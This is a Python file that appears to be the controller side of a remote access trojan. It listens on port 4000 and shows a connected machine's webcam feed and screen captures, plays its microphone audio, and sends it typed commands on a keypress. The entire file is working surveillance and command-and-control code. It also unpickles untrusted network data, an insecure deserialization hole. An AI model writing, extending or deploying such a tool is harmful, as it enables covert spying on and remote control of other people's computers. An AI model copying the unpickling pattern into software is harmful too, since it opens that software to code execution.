import numpy as np
import keyboard
import pyaudio
import socket
import pickle
import struct
import time
import cv2

from multiprocessing import Process

host = "0.0.0.0"
port = 4000
functions_mode = ["Camera stream"]

audio = pyaudio.PyAudio()
stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, output=True, frames_per_buffer=1024)

#cv2.namedWindow('Stream', cv2.WINDOW_NORMAL)

class commandCMD():
    def __init__(self, conn):
        self.conn = conn
        self.commands()

    def commands(self):
        command = input("CMD:")
        self.conn.sendall(command.encode())

class server():
    def __init__(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.frame = None
        self.modeState = 0
        self.scrollUp = False
        self.scrollDown = True
        self.data = b""
        self.payload_size = struct.calcsize("Q")

        self.server.bind((host, port))
        self.server.listen(10)
        conn, addr = self.server.accept()
        self.conn = conn

        print(f"Select mode: {functions_mode[self.modeState]}")

    def start(self):
        while True:
            if keyboard.is_pressed("up")and self.scrollUp:
                self.modeState -= 1
                print(f"Select mode: {functions_mode[self.modeState]}")
                time.sleep(0.5)
            elif keyboard.is_pressed("down") and self.scrollDown:
                self.modeState += 1
                print(f"Select mode: {functions_mode[self.modeState]}")
                time.sleep(0.5)

            elif keyboard.is_pressed("enter"):
                print(f"{functions_mode[self.modeState]} activated.")
                self.conn.sendall(functions_mode[self.modeState].encode())
                break

            if self.modeState < 1:
                self.scrollUp = False
            else:
                self.scrollUp = True
            
            if self.modeState > 2:
                self.scrollDown = False
            else:
                self.scrollDown = True

            time.sleep(0.2)

        if functions_mode[self.modeState] == "Camera stream":
            print("Camera initiation")
            proc = Process(target=self.processData, args=(self.conn,))
            proc.daemon = True
            proc.start()
            
            self.conn.sendall(b"start_cam_stream")
            self.showCam()

    
    def playMic(self, data):
        stream.write(data)

    # def showScreen(self, frame):
    #     cv2.namedWindow("Image", cv2.WINDOW_NORMAL) 
    #     cv2.resizeWindow("Image", 1920, 720)
    #     cv2.imshow("Image", frame)
    #     cv2.waitKey(1)

    def decodeCam(self, cameraPacket, cameraDump):
        data = b""
        payload_size = struct.calcsize("Q")
        
        try:
            frame_pack = cameraPacket[:payload_size]
            data = cameraPacket[payload_size:]
            #print("Packed message size:", frame_pack)
        except Exception as err:
            print("Error: ", err)

        try:
            pack_size = struct.unpack("Q", frame_pack)[0]
            #print("Unpacked message size:", pack_size)
        except struct.error as err:
            print("Error: ", err)

        frame_data = cameraDump[:pack_size]
        data = cameraDump[pack_size:]
        
        try:
            img = pickle.loads(frame_data)
            return img
        except Exception as err:
            print("Pickle Error: ", err)
            return None

    def processData(self, conn):
        while True:
            action = conn.recv(1)[0]

            if action == 0x01 or action == 0x03:
                frame_pack_len = conn.recv(1)[0]
                cameraPacket = conn.recv(frame_pack_len)

                if not cameraPacket:
                    continue

                packet_len = conn.recv(3)
                packet_len = (packet_len[0] << 16) + (packet_len[1] << 8) + packet_len[2]
                cameraDump = conn.recv(packet_len)

                frame = self.decodeCam(cameraPacket, cameraDump)

                if frame is not None:
                    if action == 0x01:
                        cv2.imshow("Stream", frame)
                        cv2.waitKey(1)
                    
                    if action == 0x03:
                        image_opencv = cv2.imdecode(frame, cv2.IMREAD_COLOR)

                        cv2.namedWindow("Screen", cv2.WINDOW_NORMAL) 
                        cv2.resizeWindow("Screen", 1920, 720) 

                        cv2.imshow("Screen", image_opencv)
                        cv2.waitKey(1)
        
            elif action == 0x02:
                mic_packet = conn.recv(2048)
                self.playMic(mic_packet)


    def showCam(self):
        while True:
            if keyboard.is_pressed("t"):
                self.conn.sendall(b"cmd_packet")
                commandCMD(self.conn)
            else:
                self.conn.sendall(b"start_cam_stream")

if __name__ == "__main__":
    s = server()
    s.start()